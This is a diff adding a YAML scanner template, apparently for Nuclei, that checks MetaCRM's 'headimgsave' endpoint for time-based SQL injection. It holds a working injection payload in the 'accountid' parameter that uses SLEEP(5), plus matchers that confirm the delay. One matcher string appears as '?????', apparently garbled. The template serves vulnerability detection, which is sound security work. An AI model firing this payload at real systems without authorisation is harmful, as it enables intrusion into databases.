@@ -1,0 +1,30 @@
+id: poc-yaml-metacrm-headimgsave-sqli
+info:
+  name: MetaCRM headimgsave SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    MetaCRM Customer Relationship Management System contains a SQL injection vulnerability in the `headimgsave` endpoint.
+http:
+  - raw:
+      - |
+        GET /headimgsave?accountid=1%27+AND+(SELECT+*+FROM+(SELECT+SLEEP(5))x)--+ HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"message\":\"?????\""
+      - type: regex
+        part: body
+        regex:
+          - "^((?!<).)*$" # Ensures that '<' is not in the response body
+      - type: dsl
+        dsl:
+          - duration > 5 && duration < 7
